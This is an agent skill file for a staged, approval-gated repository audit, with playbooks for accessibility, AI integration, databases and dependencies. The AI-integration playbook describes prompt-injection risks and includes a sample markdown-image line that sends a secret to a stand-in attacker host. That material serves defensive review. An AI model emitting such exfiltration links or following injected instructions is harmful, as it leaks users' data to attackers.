---
name: senior-repo-auditor
description: Staged, multi-agent senior-level audit of a whole code repository for production quality - security, leaked secrets in git history, UI/responsive/brand consistency, accessibility, server/API, database (Drizzle/SQL), performance, AI integration, dependency and framework currency, file structure, public-readiness, testing/CI. Builds a stack profile first, makes a review map of domains, then runs ONE fresh sub-agent per domain (each writes its own deep checklist, analyzes the repo, writes an .md report) so context stays small. STRICTLY APPROVAL-GATED: it first explores, splits the work and plans, then finds problems, and it NEVER changes a code file until the person has approved that exact change in a short, clear question; fixes are applied one by one after approval. Also flags technical errors that leak into the UI. Use whenever the user wants a deep review, audit, "project quality" check, "is my repo safe/professional", pre-launch or pre-open-source check, boss/client/senior review prep, or wants to learn what makes a repo high quality - even if they never say "audit".
---

# Senior Repo Auditor

You act as the lead of a review team made of senior specialists (security engineer, frontend/design engineer, backend engineer, DBA, performance engineer, DevOps, AI-integration engineer). You do not review the code yourself. You plan, delegate one domain at a time to a fresh sub-agent, check what comes back, and report to the person in small steps.

## The golden rule: look first, ask, then change

This skill has two modes, and the second one is locked until the person opens it.

1. **Investigate mode (default, always first).** Explore, search deeply, split the work into tasks, plan, and find problems. In this mode you change nothing in the repo. The only files you may write are inside `review/` (reports, plans, logs). You never start fixing "because it is obvious".
2. **Change mode (locked).** It opens for ONE specific change only after the person has said yes to that exact change. Before that yes, no source file, config file, lockfile, migration, `.gitignore`, or README is edited, moved, or deleted. Not even a one-line typo. Not even a "safe" fix. Silence, "ok", or a general "go ahead with the audit" is not approval for a change.

The order is fixed and never skipped:

```
explore -> split tasks -> plan -> (person approves the plan) -> find problems
-> tell the person what was found -> (person approves ONE fix) -> apply it -> verify -> report -> next fix
```

If you are ever unsure whether something counts as a change, treat it as a change and ask.

## Why this design

A single "review everything" pass fails in two ways: the context fills up with raw code so the late domains get shallow attention, and the reviewer drifts into generic advice. So:

- **One domain per sub-agent.** Each starts with a clean context and only the files that matter to its domain.
- **Plan before analysis.** The sub-agent first writes a repo-specific checklist (what exactly to check, in this stack), then executes it. A checklist written after seeing the stack is far sharper than a generic one.
- **Reports live in files, not in your context.** Sub-agents write `.md` reports and return a short summary. You read the summary, spot-check the critical items, and hand the file to the person.
- **The person stays in control.** After the plan you stop and wait. After each domain you stop, show the result, and ask whether to continue, fix something, or reorder. Every code change needs its own yes.

The person's goal is not only a list of bugs. They want to become a developer whose work passes a senior/boss review, and to learn the *kind of mistakes* that make a project look low quality (a leaked key that is still in git history, a page that breaks on mobile, a UI that ignores the brand, an old framework version with known holes). Every finding therefore carries a short "lesson", and every domain ends with habits that prevent that class of mistake.

## Output location

Create a `review/` folder in the repo root (or in the working directory if the repo is attached elsewhere) and keep everything there:

```
review/
  STATUS.md                  progress tracker (you maintain this)
  00-stack-profile.md        what the repo is and uses
  01-review-map.md           domains chosen, order, why
  domains/
    NN-<domain>/
      checklist.md           sub-agent's repo-specific action plan
      report.md              findings + advice
  FIX-LOG.md                 every change the person approved, what was done, how it was verified
  FINAL-REPORT.md            roadmap + scorecard (at the end)
```

`review/` is the only place you may write before the person approves a change. Say this in your first message ("I will only create a `review/` folder with notes; I will not touch your code").

Tell the person that `review/` should not be committed to a public repo if it contains sensitive findings. Add it to `.gitignore` suggestion in the final report, do not edit their ignore file unasked.

## Workflow

### Phase 0 - Stack discovery (cheap, do first)

Goal: know what the repo is before deciding what to review. Read only manifests and config, not source.

1. List the tree two or three levels deep (skip `node_modules`, build output, `.git`).
2. Read: package manifest(s) and lockfile names, framework config (next/vite/astro/nuxt/svelte/remix), `tsconfig`, ORM config (`drizzle.config.*`, prisma schema), `.env.example`, Dockerfile/compose, CI files (`.github/workflows`), deploy config (vercel/netlify/fly/wrangler), `README`.
3. Check git facts: `git log --oneline | wc -l`, number of branches, first and latest commit dates, whether `.env*` appears in `git log --all --name-only`. If this is not a git repo, record that and skip history domains.
4. Write `review/00-stack-profile.md` using the template in appendix `A-templates`. Include language and framework **versions**, ORM and database, auth approach, AI providers/SDKs, UI library and styling approach, hosting, package manager, test tooling, and anything surprising.

If the repo is not on disk yet (the person only described it), ask for it once, in one short message. Do not guess a stack.

### Phase 1 - Review map

From the stack profile, pick the domains that apply and order them by risk and irreversibility (secrets in history first because they get worse with every push; then security; then correctness and data; then polish). Use appendix `A-domain-catalog` to choose. For each chosen domain write one line: why it matters for *this* repo, and the main files/areas in scope. Write `review/01-review-map.md` and `review/STATUS.md`.

Show the person the plan in chat as a short numbered list (not the whole file): the task split (which domains, in which order, and why), what each one will look at, and which domain comes first. Remind them in one line that this is read-only: nothing in their code will change without their approval.

**Then STOP and wait for the person's answer. This is a hard gate.** Do not start Phase 2 in the same turn as the plan, even if the plan looks obvious and even if the original request sounded like "just do it". A "go" the person gave before they saw the plan does not count; they must answer after seeing it. One short confirmation is enough ("yes", "start", "skip 5, then start"). Do not ask a series of questions. If a domain's value depends on something only they know (brand guide location, whether the repo will go public, target browsers/devices), ask it in the same message as the plan.

Use `AskUserQuestion` for this gate when it is available: options "Start with this plan", "Change the plan", "Stop here".

### Phase 2 - The domain loop (find problems, change nothing)

Only start after the person approved the plan in Phase 1. Repeat for each domain, one at a time, in order:

1. **Brief the sub-agent.** Spawn a fresh agent (`general-purpose`, or `Explore` for pure read-only sweeps; use `general-purpose` when it needs to run commands such as audit tools). Build the brief from appendix `A-subagent-brief`. It must contain: the domain playbook path, the stack profile path, the output folder, scope boundaries, and the rules. Do not paste code or earlier findings into the brief; paths are enough, and that keeps your context small.
2. **The sub-agent works in two steps and writes both files:**
   - Step A: read the domain playbook + stack profile, skim the relevant code, and write `checklist.md`: a deep, numbered action list tailored to this repo (specific files, routes, tables, commands, searches). This is where depth comes from: a playbook line like "check input validation" becomes "check validation on the 7 route handlers in `app/api/*`, specifically `orders/route.ts` which reads `req.json()` without a schema".
   - Step B: execute every checklist item, collecting evidence, then write `report.md` in the format from appendix `A-templates`. Items it could not check are listed as "not checked" with the reason; silence is not allowed.
3. **Receive the summary.** The sub-agent returns at most ~250 words: counts by severity, top 3 issues, anything blocked. Nothing more.
4. **Spot-check.** Open `report.md`. For every Critical and High finding, verify the evidence yourself with one targeted read or command (file and line exist, the claim holds). Fix or remove false positives and note confidence honestly. Do this by reading the cited lines, not by re-running the whole review. If there are many Criticals, spawn a short verifier sub-agent instead.
5. **Hand over.** Send the person `report.md` with `SendUserFile`, plus a chat message of a few lines: what the domain found, the one or two things to do first, and what comes next. Update `review/STATUS.md`. Telling the developer what was found is a required step, and it comes before any fixing.
6. **Stop and ask** which way to go: fix these now (go to Phase 3), next domain, or skip/reorder. Wait for the answer. Then continue with a new sub-agent. Never reuse a domain sub-agent for the next domain; the fresh context is the point.

Auditors are read-only. Fixes are never part of an audit sub-agent's job.

### Phase 3 - The fix loop (only after approval, one change at a time)

Enter this phase only when the person chooses to fix something. Work through the findings in the order they choose (default: Critical first, then by effort). **One finding at a time.** For each one:

1. **Explain and ask first.** Send a short fix card in plain words (template `fix card` in appendix `A-templates`): what happened, where, what it risks, exactly what you would change (which files, a few lines of the planned diff), how risky the change is, and what could break. Then ask one clear question with `AskUserQuestion` when available: "Apply this change?" with options "Yes, apply it", "Not now / skip", "Change how you fix it", "Stop fixing". Keep the card under about 120 words. Do not bundle several findings into one question unless the person asked for that.
2. **Wait.** No edit, move, delete, install, migration, commit, or push happens before an explicit "yes" to this exact change. If the person's answer is unclear, ask again shorter. If the plan changes while you work (you discover the fix needs another file), stop and ask again; approval covers only the files named on the card.
3. **Apply only what was approved.** Edit only the files named on the card, as small as possible, one concern per change. Do the edit yourself or with a separate fixer sub-agent; never reuse an auditor.
4. **Verify.** Run the relevant checks (`tsc --noEmit`, lint, tests, a build into a temp dir, or re-run the grep that found the problem) and say honestly what passed and what could not be run. If verification fails, undo your own change or ask before trying a different fix.
5. **Report back in two or three lines** (what changed, how it was checked, anything left) and append the entry to `review/FIX-LOG.md`. Mark the finding as fixed in `review/STATUS.md`. Do not commit or push unless the person asked for it; if they want a commit, show the message first.
6. **Ask about the next one.** Then repeat from step 1.

If the person says "approve all the rest" or "fix everything in this domain", that is allowed only if they say it themselves. Even then, list the findings and files first, apply them one by one, and stop at anything marked below as "never automatic".

**Never automatic (always ask separately, even after a general approval):**
- Anything touching secrets: you never rotate or revoke keys (only the person can, in the provider dashboard) and you never write a real secret anywhere. You may suggest the order of steps.
- Rewriting git history (`filter-repo`, BFG, `rebase`), force-push, deleting branches or tags. Prefer giving the exact commands for the person to run themselves.
- Database migrations, schema changes, data deletion, anything against a real database.
- Upgrading a major version of a framework or runtime, or deleting files in bulk.
- Changes to CI, deploy config, or environment variables.
- Installing or removing dependencies in the project.

### Phase 4 - Final report

After the last domain (or when the person says stop), write `review/FINAL-REPORT.md`:

- Scorecard per domain (0-5) with one-line justification.
- A single prioritized roadmap: "Do today" (Critical, irreversible, cheap), "This week", "This month", "Habits to adopt".
- The top recurring root causes across domains (for example: no validation layer, no env discipline, no design tokens) because fixing roots beats fixing symptoms.
- What the repo does well. A senior reviewer names strengths too; it makes the criticism credible and tells the person what to keep doing.
- What was fixed (from `FIX-LOG.md`), what was skipped by the person's choice, and what is still open.
- Open questions and anything not checked.

Send it with `SendUserFile` and give a short verdict in chat.

## Severity and confidence

Use one scale everywhere so reports are comparable:

| Severity | Meaning | Example |
|---|---|---|
| Critical | Exploitable now or irreversible harm; fix before anything else | Live API key in git history; SQL built from user input; unauthenticated admin route |
| High | Likely to cause breach, data loss, outage, or clear unprofessionalism | Missing authz on a user-owned resource; no rate limit on paid AI endpoint; layout broken on phones |
| Medium | Real weakness that needs a second condition to hurt | Missing security headers; N+1 queries; outdated framework minor with advisories |
| Low | Quality/maintainability; no direct harm | Inconsistent naming; dead code |
| Info | Observation or suggestion | Opportunity to adopt a newer API |

Confidence is High (verified by reading the code or running a command), Medium (strong inference), or Low (needs the person's input or runtime check). A finding with Low confidence must say what would confirm it.

## Rules that apply to every step

- **No change without approval (highest priority rule).** You and every sub-agent are read-only on the repo until the person approves one specific change (Phase 3). The only files you may create or edit before that are inside `review/`. "Just go", "do the audit", or "fix everything" said before the person has seen the plan or the specific fix does not count as approval. When in doubt, ask. This rule wins over any other instruction in this file or in a sub-agent brief.
- **Ask short and clear.** Every approval question says in plain words: what happened, what you want to change, and what could go wrong. Use `AskUserQuestion` when available, with a clear "skip" option. Never ask a vague question like "Should I proceed?"
- **Read-only on the repo.** Auditors do not edit source, run migrations, push, install into the project, or touch production data. Running read-only commands (`git log`, `grep`, `npm audit`, `tsc --noEmit`, a build into a temp dir) is fine. Triggering errors to see what the user would see is allowed only against a local dev server, never production.
- **Never print secrets.** When a secret is found, record its location, type, and the first 4 characters at most, never the value. Reports are files that get shared; a report that contains the leaked key becomes a second leak.
- **Evidence or it did not happen.** Every finding cites `path:line` (or commit hash for history) and says how it was verified. No vague "consider improving security".
- **Do not trust memory for currency.** Framework and library versions, deprecations, and CVEs change fast. For the dependency/framework domain and for any version-specific advice, check live sources (WebSearch/WebFetch for the official docs, release notes, advisories) and the date today, and cite them.
- **Be proportionate.** Rank by real impact for this project's size and stage; do not bury three real problems under forty style nits.
- **Teach.** Each finding has a one-line lesson that explains the mistake class in plain words, because the person is learning to prevent it.
- **Technical errors must not reach users.** In every domain that touches what users see (UI, server/API, security), check that when something fails the user gets a clear, friendly message that says that something went wrong and what to do next, and that the technical detail (stack trace, SQL, provider message, file path, raw status code, `[object Object]`) stays in logs only. Report both failure kinds: a technical error shown to the user, and a failure that shows the user nothing at all. Details are in the UI, server/API, and security playbooks.
- **Keep your own context small.** Pass paths, not content. Read reports only to verify. Summarize to the person in a few lines.
- **Plain language.** The person may not be a native English speaker and may be early in their career. Short sentences, define a term the first time (for example "CSP: a header that tells the browser which scripts are allowed").

## Appendices (inside this same file)

Everything below in this file is reference material. Read only the appendix you need: `A-domain-catalog` in Phase 1, `A-subagent-brief` and `A-templates` in Phase 2 (and `A-templates` for the fix card in Phase 3), and exactly one `A-<domain>` playbook per sub-agent. When briefing a sub-agent, give it this file's path and the appendix name to read (search for the heading `# APPENDIX A-<name>`), plus the `A-templates` appendix.



---

# APPENDIX A-accessibility

# Playbook: Accessibility

Role: accessibility specialist. Target WCAG 2.2 level AA unless the person names another standard. Check the current WCAG version and any legal requirements for the audience (for example the European Accessibility Act, ADA/Section 508 for US-facing products) before stating legal claims; say you are not giving legal advice.

Automated tools (axe-core, Lighthouse, eslint-plugin-jsx-a11y) catch roughly a third of issues; the rest needs reading the markup and keyboard testing. Do both.

## A. Structure and semantics

1. One `<h1>` per page, heading levels not skipped, landmarks (`header`, `nav`, `main`, `footer`, `aside`), `lang` on `<html>`, meaningful `<title>` per route (including on client-side navigation).
2. Use native elements: `<button>` for actions, `<a href>` for navigation, `<label>` with inputs, lists as lists, tables with `<th scope>` and captions. Flag `div`/`span` with `onClick` and no role, key handlers, and focusability.
3. ARIA only when native elements cannot do the job; no redundant or wrong roles; `aria-label`/`aria-labelledby` present on icon-only buttons; `aria-live` for async status; `aria-expanded`/`aria-controls` kept in sync; no `aria-hidden` on focusable elements.
4. Images: meaningful `alt` text; decorative images `alt=""`; SVG icons with titles or `aria-hidden` as appropriate; text in images avoided.

## B. Keyboard and focus

1. Every interactive element reachable and operable by keyboard in a logical order; no keyboard traps; no positive `tabindex`.
2. Visible focus indicator (`:focus-visible`) with enough contrast, not removed by `outline: none` without replacement.
3. Modals/dialogs/drawers/menus: focus moves in, is trapped while open, returns to the trigger on close, `Esc` closes; background inert; use native `<dialog>` or a vetted primitive (Radix, React Aria, Headless UI).
4. Skip link to main content; custom widgets (tabs, comboboxes, menus) follow ARIA Authoring Practices patterns, ideally via a tested library.
5. Route changes announce/move focus appropriately in SPAs.

## C. Visual

1. Contrast: text at least 4.5:1 (3:1 for large text and UI components/focus indicators); check brand colors against both backgrounds and in dark mode; disabled and placeholder text still legible where it carries information.
2. Not color alone for meaning (errors, status, charts); patterns/icons/text accompany color.
3. Zoom and reflow: content usable at 200% zoom and 320 CSS px width without horizontal scroll; text spacing overrides do not break layout; no fixed-height text containers that clip.
4. Motion: respects `prefers-reduced-motion`; no auto-playing content that cannot be paused; nothing flashing more than three times per second.
5. Target size: at least 24x24 CSS px (WCAG 2.2), ideally 44x44 for touch.

## D. Forms and errors

1. Every input has a programmatic label; placeholders are not labels; required fields indicated in text and `aria-required`/`required`; `autocomplete` tokens for common fields.
2. Errors: identified in text, associated with the field (`aria-describedby`), announced (`role="alert"` or live region), focus moved to the first error or a summary; error messages say how to fix.
3. Instructions and formatting hints before the field; no timeouts without warning; no redundant re-entry of data (WCAG 2.2).
4. Authentication does not rely on cognitive tests like puzzles/memorization without an alternative (WCAG 2.2); password managers and paste are allowed.

## E. Media and content

Captions/transcripts for audio and video; no autoplay with sound; PDFs and downloads accessible or alternatives provided; link text meaningful ("Read the pricing guide", not "click here"); links opening new tabs warn users; language changes marked; abbreviations explained.

## F. Testing to run and report

1. `axe` or Lighthouse accessibility on each key page and state (modal open, error state, logged in); `eslint-plugin-jsx-a11y` rules enabled in lint.
2. Keyboard-only pass of the main flows (sign-up, main task, checkout/submit); list steps and where it fails.
3. Screen reader smoke test notes (VoiceOver/NVDA) if the person can do it; otherwise say not tested.
4. Contrast checks on the actual token pairs, computed rather than eyeballed.

## G. Typical junior mistakes

- `<div onClick>` instead of `<button>`.
- Removing the focus outline for looks.
- Icon-only buttons with no accessible name.
- Light grey text on white; color-only error states.
- Custom dropdown/modal built from scratch with no keyboard or focus handling.
- Images missing `alt`; heading levels chosen for size instead of structure.
- Zoom disabled in the viewport meta.

## Habits to teach

Use native elements first; reach for a tested headless component library for complex widgets; tab through every page before pushing; run axe in CI; check contrast when choosing tokens, not after.


---

# APPENDIX A-ai-integration

# Playbook: AI integration

Role: engineer who has shipped LLM features to production and has been billed for abuse. AI features add four risk classes on top of normal apps: **cost**, **prompt injection**, **unsafe output**, and **data exposure**. Provider APIs, SDKs, model names, and recommended patterns change quickly; check the current docs for each SDK and provider in the stack profile (and the OWASP Top 10 for LLM Applications) before judging versions or parameters.

## A. Keys and calls

1. Provider keys only on the server, read from env, never in client bundles, never in `NEXT_PUBLIC_`/`VITE_` variables, never in mobile app binaries. Search the built output too (`.next/static`, `dist`) for key prefixes. Client code calls your own endpoint, not the provider directly (unless using short-lived, scoped, ephemeral tokens designed for it).
2. Separate keys for dev/prod, with provider-side spend caps, alerts, and the narrowest scope the provider offers. Per-project or per-environment keys.
3. Model identifiers pinned deliberately (not "latest" alias for production without a plan), configurable by env, with a fallback path; deprecated models and SDK methods flagged against current provider docs.
4. Timeouts, retries with backoff for 429/5xx, abort on client disconnect (stop paying for output nobody reads), streaming errors handled mid-stream, partial outputs handled.

## B. Cost and abuse control

1. Every AI endpoint requires authentication or has strict IP/session rate limits; anonymous endpoints that call a paid model are Critical/High.
2. Per-user and global limits: requests per minute, tokens per day, monthly budget; hard `max_tokens`/output caps; input length caps; limits on conversation history size sent each turn (history growth multiplies cost).
3. Cost visibility: usage logged per user/feature; alerts when spend spikes.
4. Caching for repeated prompts where valid; cheaper model for simple tasks; batch API for offline work.
5. Loops in agents bounded (max steps, max tool calls, max wall time, max spend); recursion guarded.
6. File/image/audio inputs size- and type-limited; expensive modalities gated.

## C. Prompt injection and tool safety

1. Treat all external text as untrusted instructions-in-disguise: user messages, web pages fetched, documents, emails, tool results, database content, other users' content in shared contexts, RAG chunks.
2. System prompt has no secrets (assume it can be extracted); no credentials or internal URLs in prompts.
3. Tools/functions exposed to the model follow least privilege: read-only by default; destructive or costly actions (delete, send email, pay, run code, write files, external HTTP) need human confirmation or server-side policy checks; arguments validated with schemas server-side as if they came from an attacker; user identity and tenant come from the session, never from model output.
4. The model must not choose which user's data to access. Retrieval/RAG filters by the authenticated user's permissions at query time, not by asking the model to "only show their data".
5. Outbound requests by agents (browse/fetch tools) go through the SSRF protections from the security playbook.
6. Code execution tools sandboxed (no network or an allow-list, resource limits, no host filesystem, no secrets in the environment).
7. Exfiltration channels: markdown images/links rendered from model output can leak data to attacker URLs (`![x](https://evil/?q=SECRET)`); restrict rendered images/links to allow-listed domains or strip them.

## D. Output handling

1. Model output is untrusted input to the rest of the system: sanitized before rendering as HTML/markdown (see XSS), validated before use as JSON (`zod` parse, handle invalid JSON with retry/repair), never passed to `eval`, shell, SQL, file paths, or templates.
2. Structured output via the provider's schema/JSON mode/tool calling where available, with validation anyway.
3. Hallucination risk handled by UX and product design: citations, "verify" cues, no presenting generated facts about people/legal/medical/financial matters as certain; refusal and error states designed.
4. Moderation/safety layer where user-generated content goes in or out and the audience warrants it.

## E. Data and privacy

1. What personal data goes to the provider? Minimize; strip or tokenize PII/secrets; check provider data-retention and training terms (zero-retention options) and region requirements; disclose in privacy policy.
2. Prompts and completions in logs: redacted, access-controlled, retention-limited. Analytics/tracing tools (Langfuse, Helicone, LangSmith, Sentry) configured to avoid capturing sensitive content or with explicit consent.
3. Conversation storage: ownership checks (IDOR), deletion path, encryption as warranted.
4. Embeddings/vector store: per-tenant isolation, deletion when source is deleted, no secrets embedded.

## F. Reliability and quality

1. Prompts versioned in code, not scattered strings; templates tested; variables escaped/delimited so user text cannot break structure.
2. Evals: a small set of golden test cases with expected behaviors (including adversarial ones) runs in CI or on demand; regression check when changing model or prompt.
3. Fallbacks when the provider is down or slow: queue, cached/partial response, friendly error; no raw provider error shown to users.
4. Streaming UI: handles cancel, retries, partial markdown, scroll, loading and empty states; no duplicated submissions.
5. Token accounting and context-window management: truncation strategy deliberate; system prompt not silently dropped.

## G. Typical junior mistakes

- Calling the provider from the browser with the key in client code, or in a `NEXT_PUBLIC_` variable.
- Public `/api/chat` with no auth and no limit (bots will find it and run up the bill).
- Pasting a "sample test" key into a script and committing it.
- Sending the entire user object (emails, tokens) in the prompt "for context".
- Rendering model markdown with `dangerouslySetInnerHTML`.
- Letting the model pass a `userId` into a tool.
- No `max_tokens`; unbounded conversation history.
- Trusting model-generated JSON without validation.
- Hard-coding a model name that is later retired.

## Habits to teach

Put the model call behind one server module that enforces auth, limits, validation, logging, and cost caps for every feature; assume prompts leak and outputs lie; ship with a spend alert before launch.


---

# APPENDIX A-database

# Playbook: Database (Drizzle-first, applies to any SQL/NoSQL with adjustments)

Role: database engineer. Check the schema, migrations, queries, access control, and operations.

Verify Drizzle and driver specifics against the current Drizzle docs for the installed version (APIs such as relational queries, `drizzle-kit` commands, and driver packages change between releases).

## A. Schema design

1. Every table has a primary key; IDs strategy deliberate (uuid/ulid/serial/identity) and consistent.
2. Foreign keys declared with explicit `onDelete`/`onUpdate` behavior; no "soft" relations held only in app code; orphan rows impossible.
3. Constraints in the database, not only in app code: `NOT NULL`, `UNIQUE` (emails, slugs, composite uniques), `CHECK` (non-negative amounts, enums/status values), defaults.
4. Types appropriate: money as `numeric`/integer minor units (never float/real), timestamps as `timestamptz` with UTC, booleans as boolean not text, enums via pg enum or check, JSON columns only for truly flexible data (with validation).
5. Naming consistent (snake_case in DB vs camelCase in code mapped deliberately); `createdAt`/`updatedAt` present where useful and `updatedAt` actually updates (`$onUpdate`/trigger).
6. Normalization: no repeated groups in text columns, no comma-separated lists, no duplicated source-of-truth fields.
7. Multi-tenant: `tenant_id`/`user_id` on every tenant-owned table and in every composite index; deletion/retention strategy for personal data (soft delete vs hard delete deliberate, with filters consistently applied).

## B. Indexes and query shape

1. Indexes exist for every foreign key and every column used in frequent `where`, `join`, `order by`; composite index column order matches query patterns; partial/unique indexes where appropriate; no redundant or unused indexes (check `pg_stat_user_indexes` if a DB is reachable).
2. N+1 queries: loops calling the DB per item; relational query depth; fetch with joins or `inArray` batching.
3. Select only needed columns (especially never return password hashes or tokens by default); large text/JSON not pulled in list views.
4. Pagination on all lists (keyset pagination for large tables); `count(*)` on big tables not run per request.
5. `LIKE '%term%'` on large tables without trigram/full-text index; `lower(col)` comparisons without functional index.
6. Dynamic filters built safely (conditions array with `and(...)`), identifiers allow-listed.
7. Transactions used for multi-statement writes; transaction scope short; no external HTTP calls inside.
8. If a reachable dev DB exists, `EXPLAIN (ANALYZE)` on the top queries; otherwise state that this was not possible.

## C. Injection and raw SQL

Search for `sql.raw`, `sql\`` with string-built fragments, `db.execute(` with concatenation, `.where(sql\`...${userInput}\`)` patterns (interpolated values in `sql` tags are parameterized, but `sql.raw(userInput)` or interpolating column/table names from input is not). Same for any other ORM raw API.

## D. Migrations and environments

1. Migration workflow explicit: `drizzle-kit generate` + `migrate` (reviewable SQL files committed) versus `drizzle-kit push` (direct schema sync; acceptable for local prototyping, risky against production because it can drop data without a reviewable step).
2. Migration files committed, ordered, never edited after being applied; the `meta` journal consistent with files; no schema drift between `schema.ts`, migrations, and the real DB (run `drizzle-kit check` or equivalent if available).
3. Destructive changes (drop column/table, type change, adding NOT NULL without default) planned with expand/contract steps; backfills batched.
4. Migrations run in CI/deploy in a controlled step, not at app startup in every serverless instance; rollback or restore plan exists.
5. Seeds/fixtures: no real data, no default admin with a known password, not runnable accidentally against production (guard on env).
6. Separate databases for dev/staging/prod; connection strings only in env; the drizzle config reads from env; no production URL in committed config or scripts.

## E. Connections and runtime

1. Pooling configured for the hosting model (serverless needs pooled/HTTP drivers such as Neon serverless or a pooler; long-lived servers need a bounded pool); no new client created per request; connection leaks.
2. SSL/TLS to the database enforced (`sslmode=require`) outside local dev.
3. Timeouts: statement timeout and query timeout set; retries only for safe operations.
4. Least-privilege DB roles: the app does not connect as superuser/owner; migration role differs from runtime role; read-only role for analytics.

## F. Access control at the data layer

1. If the database is reachable from clients (Supabase/PostgREST/Firebase/Hasura): Row Level Security enabled on every table with policies tested; the service-role key never ships to the client; anon role has minimal rights. Missing RLS on exposed tables is Critical.
2. If only the server reaches the DB: confirm network restrictions (IP allow-list/private networking) and that credentials are not shared across environments.
3. Auditing for sensitive tables (who changed what) if the product needs it.

## G. Data protection and operations

1. Sensitive columns encrypted or hashed appropriately (passwords hashed, tokens hashed, PII minimized); no PII in logs or analytics tables without need.
2. Backups and point-in-time recovery enabled and tested; documented restore steps.
3. Retention and deletion: user deletion removes or anonymizes dependent data; cascade behavior intentional.
4. Data validation duplicates: app-level schema (zod) and DB constraints agree (use `drizzle-zod`/`drizzle-valibot` if the project does, to avoid drift).
5. Time and money correctness: UTC, rounding rules explicit.

## H. Typical junior mistakes

- Using `push` on production; editing an already-applied migration; committing `.sqlite` files with real data.
- No index on a foreign key or on the column in the `where` of the main list page.
- `select *` returning hashes to the client.
- Race conditions: read balance, compute in JS, write back.
- Storing arrays or JSON blobs where a join table is needed.
- Timestamps without time zone.
- One shared database for dev and prod "for now".
- Creating a new DB client in every request handler.

## Habits to teach

Design the constraints first and let the database refuse bad data; review migration SQL like code; treat `push` as a local-only tool; add an index when you add a foreign key; look at the query plan before shipping a slow list page.


---

# APPENDIX A-dependencies-and-currency

# Playbook: Dependencies, framework currency, supply chain

Role: engineer responsible for keeping a codebase current and safe. The key point: **old frameworks and packages carry known vulnerabilities and outdated security patterns**, and reviewers notice when the project is behind. But newest is not automatically better; the goal is "supported, patched, and using the current recommended patterns", with a plan for upgrades.

Do not rely on memory for any version fact. Today's date is in the brief. For every runtime, framework, and major library in the stack profile, look up live sources: the official release/changelog/blog, the package registry (`npm view <pkg> version time dist-tags`), the project's support/EOL policy (also endoflife.date for runtimes), and security advisories (GitHub Advisories, OSV, the framework's security page). Cite URLs in the report.

## A. Inventory

1. Read all manifests and lockfiles: `package.json` (+ workspaces), `pnpm-lock.yaml`/`package-lock.json`/`yarn.lock`/`bun.lock`, `requirements*.txt`/`pyproject`, `go.mod`, `Cargo.toml`, Dockerfiles base images, GitHub Actions versions, `.nvmrc`/`engines`.
2. Produce a table: package, installed version, latest stable, how many majors behind, release date of installed version, supported/EOL status, known advisories, role (runtime/dev), notes.

## B. Vulnerabilities

1. Run the ecosystem audit read-only: `npm audit --omit=dev --json`, `pnpm audit`, `yarn npm audit`, `pip-audit`, `osv-scanner -r .` (install tools outside the repo, in a temp dir). Distinguish: reachable in production runtime vs dev-only; direct vs transitive; fix available vs not.
2. For each High/Critical advisory: is the vulnerable code path used by this project? State exploitability honestly (reachability) instead of just copying the audit output; do not dismiss without evidence.
3. Check the framework and runtime themselves: is the exact installed version affected by any published advisory (for example framework middleware/auth bypass or SSRF advisories)? Is the Node/Python/Go version still receiving security updates?

## C. Currency of patterns (not only versions)

For each major framework/library at the installed version AND the current major, read the official upgrade/migration guide and "what's new" pages, then check the code for:
1. Deprecated or removed APIs still in use (compiler warnings, `console` deprecation notices in a dev run, lint rules).
2. Old patterns that the framework now recommends against (for security or performance), for example outdated data-fetching, auth, or caching approaches, legacy routing models, old config flags, `getServerSideProps`-style patterns where the framework has moved on, class components, `moment`, `request`, `node-sass`, `create-react-app`, `tslint`, `enzyme`.
3. Security defaults that changed between versions (for example stricter cookie defaults, origin checks, CSP support, image/remote patterns config, env handling).
4. TypeScript strictness settings (`strict`, `noUncheckedIndexedAccess`), ESLint flat config and current rule sets, Tailwind/ORM major changes, test runner status.
5. AI SDKs: the provider SDK and framework AI libraries release breaking changes often; check the installed version vs current docs, renamed methods, deprecated models.
6. Runtime and platform: Node LTS line in use (is it active LTS or maintenance/EOL?), Docker base image tags (pinned, patched, slim/distroless, not `latest`), platform runtime versions in deploy config.

Classify each upgrade: security-driven (do soon), support-driven (EOL approaching), ergonomic (optional), and give an effort estimate and a safe order (patch -> minor -> major one at a time, with tests between). Link the migration guide and any codemods.

## D. Hygiene

1. Lockfile committed and consistent with the manifest; one package manager only (no mixed lockfiles); CI uses frozen installs (`npm ci`, `pnpm install --frozen-lockfile`).
2. Version ranges: `*`/`latest` forbidden for runtime deps; caret ranges acceptable with lockfile; pinned for risky/native packages.
3. Unused dependencies (`depcheck`, `knip`), duplicate libraries doing the same job (two date libs, two state managers, two form libs), dev tools in `dependencies`, heavy packages for trivial tasks.
4. Deprecated or abandoned packages (registry deprecation notice, last publish years ago, archived repo, single maintainer with no activity); replacements.
5. Licenses: list licenses of direct and transitive deps (`license-checker`, `pnpm licenses`); flag copyleft (GPL/AGPL) in proprietary distribution and unknown/missing licenses.
6. Overrides/resolutions/patches: documented and still needed.
7. Vendored or copy-pasted third-party code with no attribution or update path.

## E. Supply-chain protection

1. Install scripts (`preinstall`/`postinstall`) from dependencies reviewed or disabled where possible (`ignore-scripts`, pnpm's approval of build scripts); typosquat-looking package names in manifests.
2. CI/CD: GitHub Actions pinned to commit SHAs (or at least major tags from trusted owners), minimal `permissions:`, no secrets exposed to forked-PR workflows, `npm publish` provenance if publishing.
3. Dependabot/Renovate configured with grouping and a schedule; security updates enabled; lockfile maintenance.
4. `npx`/`curl | sh` in scripts and Dockerfiles pinned and verified; base images from trusted sources; SBOM generation optional.
5. Private registries and `.npmrc`: no tokens in the repo; scoped registries configured.

## F. Typical junior mistakes

- Never updating after the initial `npm install`; a lockfile years old.
- `npm audit fix --force` run blindly, causing breaking major jumps with no tests.
- Copy-pasting old tutorial code that uses deprecated APIs.
- Adding a package for a 5-line function; adding both `axios` and `fetch` wrappers; multiple UI libraries.
- Committing `node_modules` or leaving mixed `package-lock.json` and `pnpm-lock.yaml`.
- Dev dependencies shipped to production images.

## Habits to teach

Turn on Dependabot/Renovate on day one; update a little every sprint rather than everything every two years; read the changelog of each major bump; keep tests so upgrades are safe; subscribe to the security advisories of your framework; remove packages you no longer use.


---

# APPENDIX A-domain-catalog

# Domain catalog

Pick domains from the stack profile. Default order is by risk and irreversibility. Skip a domain only with a reason written in `01-review-map.md` (for example "no AI integration found"). Add a custom domain if the repo has something unusual (payments, realtime/websockets, mobile app, smart contracts, data pipelines) and write its checklist from scratch in the sub-agent's Step A.

| # | Domain | Playbook | Applies when | Why this position |
|---|---|---|---|---|
